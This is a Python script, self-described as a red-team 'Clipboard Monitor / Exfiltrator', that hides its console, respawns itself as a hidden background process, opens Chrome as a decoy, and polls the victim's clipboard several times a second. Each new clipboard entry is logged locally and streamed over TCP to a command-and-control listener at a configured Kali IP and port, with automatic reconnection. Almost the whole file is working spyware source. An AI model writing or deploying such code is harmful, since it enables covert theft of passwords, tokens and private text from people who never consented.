#!/usr/bin/env python3
"""
Fixed & Improved Clipboard Monitor / Exfiltrator
Educational / Red Team use only
"""

import time
import socket
import threading
import os
import sys
import subprocess
from datetime import datetime
import webbrowser

# ====================== CONFIG ======================
KALI_IP = "10.0.2.15"
KALI_PORT = 4445
HIDE_WINDOW = True
OPEN_CHROME = True
CHROME_URL = "https://www.google.com"
CHECK_INTERVAL = 0.3
RECONNECT_INTERVAL = 5
# ===================================================

class BackgroundClipboardMonitor:
    def __init__(self):
        self.last_text = ""
        self.running = True
        self.connected = False
        self.socket = None
        self.lock = threading.Lock()          # Added for thread safety

    def open_chrome(self):
        if not OPEN_CHROME:
            return
        try:
            chrome_paths = [
                r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
                rf"C:\Users\{os.getenv('USERNAME')}\AppData\Local\Google\Chrome\Application\chrome.exe"
            ]

            for path in chrome_paths:
                if os.path.exists(path):
                    subprocess.Popen([
                        path, CHROME_URL, "--new-window", "--start-maximized"
                    ], creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0)
                    print("[✓] Chrome opened")
                    return

            # Fallback
            webbrowser.open(CHROME_URL)
            print("[✓] Default browser opened")
        except Exception as e:
            print(f"[!] Browser error: {e}")

    def connect_to_c2(self):
        with self.lock:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.settimeout(5)
                self.socket.connect((KALI_IP, KALI_PORT))
                self.connected = True
                self.send_message(f"[+] Clipboard Monitor Started - {datetime.now()}")
                return True
            except:
                self.connected = False
                if self.socket:
                    self.socket.close()
                return False

    def send_message(self, message):
        with self.lock:
            if not (self.connected and self.socket):
                return False
            try:
                self.socket.send(f"{message}\n".encode('utf-8'))
                return True
            except:
                self.connected = False
                return False

    def save_locally(self, data):
        try:
            ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            # Daily backup
            backup = f"clipboard_backup_{datetime.now():%Y%m%d}.txt"
            with open(backup, 'a', encoding='utf-8') as f:
                f.write(f"[{ts}] {data}\n")
            return True
        except:
            return False

    def monitor(self):
        self.open_chrome()

        session_log = f"clipboard_session_{datetime.now():%Y%m%d_%H%M%S}.txt"
        with open(session_log, 'w', encoding='utf-8') as f:
            f.write(f"Session started: {datetime.now()}\n")
            f.write(f"Target: {KALI_IP}:{KALI_PORT}\n")

        # Auto-reconnect thread
        threading.Thread(target=self.auto_reconnect, daemon=True).start()

        print("[+] Clipboard monitor running...")

        while self.running:
            try:
                current = pyperclip.paste().strip()
                if current and current != self.last_text:
                    self.save_locally(current)
                    self.send_message(f"[{datetime.now():%Y-%m-%d %H:%M:%S}] {current}")
                    self.last_text = current
            except:
                pass
            time.sleep(CHECK_INTERVAL)

    def auto_reconnect(self):
        while self.running:
            if not self.connected:
                self.connect_to_c2()
            time.sleep(RECONNECT_INTERVAL)

    def stop(self):
        self.running = False
        with self.lock:
            if self.socket:
                try:
                    self.socket.close()
                except:
                    pass


# ====================== LAUNCHER ======================
def hide_console():
    if sys.platform == "win32" and HIDE_WINDOW:
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass


def main():
    # Install dependency safely
    try:
        import pyperclip
    except ImportError:
        print("Installing pyperclip...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyperclip"])
        import pyperclip

    hide_console()

    # Spawn hidden process (Windows)
    if HIDE_WINDOW and len(sys.argv) < 2 and sys.platform == "win32":
        subprocess.Popen([sys.executable, sys.argv[0], "hidden"],
                         creationflags=subprocess.CREATE_NO_WINDOW)
        print("[✓] Started in background")
        time.sleep(2)
        sys.exit(0)

    # Linux fork (basic)
    elif HIDE_WINDOW and len(sys.argv) < 2 and sys.platform != "win32":
        if os.fork() != 0:
            print(f"[✓] Background PID: {os.getpid()}")
            sys.exit(0)

    monitor = BackgroundClipboardMonitor()
    try:
        monitor.monitor()
    except KeyboardInterrupt:
        monitor.stop()


if __name__ == "__main__":
    main()